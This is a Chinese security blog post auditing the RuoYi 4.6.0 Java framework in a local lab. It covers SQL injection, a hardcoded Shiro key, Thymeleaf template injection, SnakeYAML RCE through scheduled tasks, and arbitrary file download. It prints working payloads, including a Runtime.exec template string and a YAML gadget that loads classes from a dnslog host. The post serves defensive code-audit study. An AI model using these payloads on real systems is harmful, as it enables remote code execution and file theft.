---
title: 若依 RuoYi4.6.0 代码审计
url: https://www.secpulse.com/archives/205550.html
source: 安全脉搏
date: 2024-12-19
fetch_date: 2025-10-06T19:35:26.546902
---

# 若依 RuoYi4.6.0 代码审计

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 若依 RuoYi4.6.0 代码审计

[代码审计](https://www.secpulse.com/archives/category/articles/code-audit)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2024-12-18

20,024

环境布置：

到官网下载源码：<https://github.com/yangzongzhuan/RuoYi>

采用phpstudy集成数据库，5.7版本。JDK1.8。

IDEA打开项目，等待自动加载，修改application-druid.yml配置文件：数据库名，账号密码，连接数据库，修改application.yml中的端口，避免与80端口冲突。

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602199.png)

导入：quartz.sql与ry\_20201214.sql文件。

运行RuoYiApplication文件。

访问后台：<http://localhost:25001/login>

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602200.png)

Sql注入漏洞：

由于该项目采用了mybatis开发，常见的找sql注入的方法就是全局搜索${

定位到可疑参数：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602201.png)

根据id值selectRoleList全局搜索，从xml定位到dao层：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602203.png)

右键单击，找该接口的使用，在使用处发现selectRoleList方法，全局搜索该方法，定位controller层查看接口与传参：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602204.png)

如下，定位到controller层：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602205.png)

分析代码：首先以@RequiresPermissions注解表明接口访问权限，再以@PostMapping注解表明接收接口，并且以@ResponseBody注解表明回将返回值写入http响应。

此方法会接收一个SysRole类型的role值，并且将接受的role值以selectRoleList方法处理后返回给list，最后返回给http响应。

于是我们现在需要分析

1：role对象在接收它的参数时是否有过滤，

2：selectRoleList方法在处理role接收后的值是否有过滤。

跟进SysRole类，发现无过滤：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602206.png)

跟进selectRoleList方法，发现无过滤：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602207.png)

于是确定原dataScope参数存在sql注入，到前端功能找对应数据包。

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602208.png)

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602209.png)

发现不存在dataScope参数,手动添加：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602210.png)

将localhost换成主机IP，放入sqlmap验证

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602211.png)

Shiro反序列化：

首先查看项目pom文件，发现shiro版本为1.7.0：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602212.png)

全局搜索cipherKey，定位到密钥值：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602213.png)

由此结合shiro反序列化利用工具利用。

Shiro未授权访问：

查看shiro配置文件ShiroConfig.java，anon为匿名拦截器，不需要登录就能访问。authc为登录拦截器，需要登录认证才能访问。

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602214.png)

Thymeleaf模板注入：

本框架采用了 Thymeleaf 模板，全局搜索::

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602215.png)

根据Mapping构造路径，发送poc

fragment=\_\_\*%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d\_\_::.x

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602217.png)

计划任务RCE:

如图添加计划任务

将调用目标字符修改如下：

```
org.yaml.snakeyaml.Yaml.load(\'!!javax.script.ScriptEngineManager
\[!!java.net.URLClassLoader \[\[!!java.net.URL
\[\"http://w2h0ib.dnslog.cn\"\]\]\]\]\')
```

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602218.png)

调用执行：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602219.png)

dnslog出现响应：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602220.png)

任意文件下载漏洞：

继续如上创建定时任务：

```
ruoYiConfig.setProfile(\'/home/clown/Project/RuoYi-v4.6.0/ruoyi-admin/src/main/resources/application.yml\')
```

执行后访问如下路径实现文件下载：

/common/download/resource?resource=.zip

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602221.png)

跟踪下载路径定位代码：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602222.png)

该处代码先接收resource的值，再将该值放入checkAllowDownload方法里面校验后，进入下载文件的代码调用。

于是跟进checkAllowDownload方法：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602223.png)

发现该方法主要做了两件事：

1：禁止掉resource中的目录穿越../

2：以白名单形式检查文件下载规则

这里主要跟进一下2的代码：

取点后缀：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602224.png)

再以点后缀进行白名单匹配：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602225.png)

如果在原controller层if判断为假，进入下载文件代码流程：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602226.png)

至此可发现下载文件的路径不可控，且类型存在白名单限制！

此时我们继续跟进本地资源路径的代码：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602227.png)

我们可以发现本地资源路径是通过getProfile进行获取，且该RuoYiConfig类存在setProfile方法，由此可知，可以通过计划任务调用该类的setProfile方法设置好路径，直接绕过了前面的if过滤：

![](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410231602228.png)

之后即可调用/common/download/resource接口任意下载文件。

**本文作者：[蚁景网安实验室](newpage/author?author_id=37244)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/205550.html**](https://www.secpulse.com/archives/205550.html)

点赞：
0
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![TongWeb闭源中间件代码审计](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/e0d9b479-dc1b-4456-a829-57d65c82fb25.png)

  TongWeb闭源中间件代码审计](https://www.secpulse.com/archives/206365.html "详细阅读 TongWeb闭源中间件代码审计")
* [![记录一次CMS的代码审计](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2025/01/VCG41N1363057543.png)

  记录一次CMS的代码审计](https://www.secpulse.com/archives/205148.html "详细阅读 记录一次CMS的代码审计")
* [![某个OA系统的代码审计](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2024/07/VCG21gic11158539.png)

  某个OA系统的代码审计](https://www.secpulse.com/archives/205256.html "详细阅读 某个OA系统的代码审计")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2024/12/logo-white.png)](https://www.secpulse.com/newpage/author?author_id=37244aaa) | [蚁景网安实验室 ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)](https://www.secpulse.com/newpa...